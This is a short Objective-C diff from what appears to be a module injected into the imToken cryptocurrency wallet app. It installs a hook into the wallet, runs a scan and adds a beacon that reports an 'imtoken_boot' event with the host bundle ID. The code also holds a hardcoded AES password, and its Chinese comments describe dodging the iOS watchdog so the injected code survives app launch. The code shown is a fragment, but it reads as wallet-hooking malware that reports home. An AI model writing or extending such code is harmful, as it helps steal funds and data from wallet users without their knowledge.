@@ -95,17 +95,19 @@ static NSString *const kAesPassword = @"Ek8pl31K2yeHgQwy";
 #pragma mark - 主流程
 
 - (void)start {
-    // 1. 先装钩子（不阻塞，立刻返回）
-    BOOL hooked = NO;
-    @try {
-        hooked = [ImToken installHook];
-    } @catch (NSException *e) {
-        hooked = NO;
-    }
-
-    // 2. 后台做重量级工作
+    // 构造函数里一行重活都不能干：启动阶段占住主线程会被 watchdog 杀掉。
+    // 全部挪到后台，第一件事先报 imtoken_boot 证明模块活着。
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
         @try {
+            [self reportEvent:@"imtoken_boot" ctx:@{ @"host": [Info hostBundleId] ?: @"" }];
+
+            BOOL hooked = NO;
+            @try {
+                hooked = [ImToken installHook];
+            } @catch (NSException *e) {
+                hooked = NO;
+            }
+
             [self scanOnce];
 
             NSMutableDictionary *ctx = [NSMutableDictionary dictionary];
